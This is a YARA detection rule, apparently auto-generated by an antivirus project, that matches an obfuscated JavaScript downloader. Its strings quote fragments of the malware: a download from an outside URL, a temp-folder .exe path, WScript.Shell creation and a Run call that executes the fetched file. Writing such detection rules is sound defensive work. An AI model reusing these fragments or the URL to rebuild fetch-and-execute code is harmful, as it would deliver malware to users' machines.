rule sig_20160329_5b0d1ab66ba608d571f232c826a0833f {
  meta:
    description = "datamaliciousorder - file 20160329_5b0d1ab66ba608d571f232c826a0833f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "19317d4015b4840574afcca162203c2cc86cae94904140215df753e5cb3cfaee"

  strings:
    $s1  = "function Htlkjrisz() {return Olnrktsgu[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"22xUuJRfk9aT0Q4.exe\";};" fullword ascii
    $s2  = "Cwrxheavx[Emapok](\"GET\", \"http://blackmountaintipis.com/mxn3aad\", false);" fullword ascii
    $s3  = "do {WScript[Udzaxiymfi](Fgthll() * 11)} while (Cwrxheavx[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Olnrktsgu = function Nducpgu() {return WScript[Xbmnwqk](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Osdqz(Lziblpb, Dbatlih){return Lziblpb - Dbatlih;};" fullword ascii
    $s6  = "function Wular() {return ((Rtnzle == true) && (Rtnzle == Projnbxv)) ? 1 : Isvrefv;};" fullword ascii
    $s7  = "function Ocwhmndpk()" fullword ascii
    $s8  = "var Rtnzle = false;" fullword ascii
    $s9  = "function Psnkmcsn(){return Dmolxglu;};" fullword ascii
    $s10 = " while (Zpxyfbbdp){" fullword ascii
    $s11 = "function Fgthll(){return 22;};" fullword ascii
    $s12 = "function Wgdpnuymqa(){return Xbmnwqk;};" fullword ascii
    $s13 = "var Paqxw = false;" fullword ascii
    $s14 = "function Ksowvuj(Sivgowxgd) {var Cbtrfepa = (1, 2, 3, 4, 5, Sivgowxgd); return Cbtrfepa;};" fullword ascii
    $s15 = "var Projnbxv = false;" fullword ascii
    $s16 = "return Osdqz(Fjguzyb, Dutkujau);" fullword ascii
    $s17 = "var Jcqwecfx = new this[\"Date\"]();" fullword ascii
    $s18 = "Rtnzle = true; " fullword ascii
    $s19 = "Projnbxv = true; " fullword ascii
    $s20 = "function Zmcagsxg(Ppljincj){Olnrktsgu[\"Run\"](Ppljincj, Isvrefv, Isvrefv);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}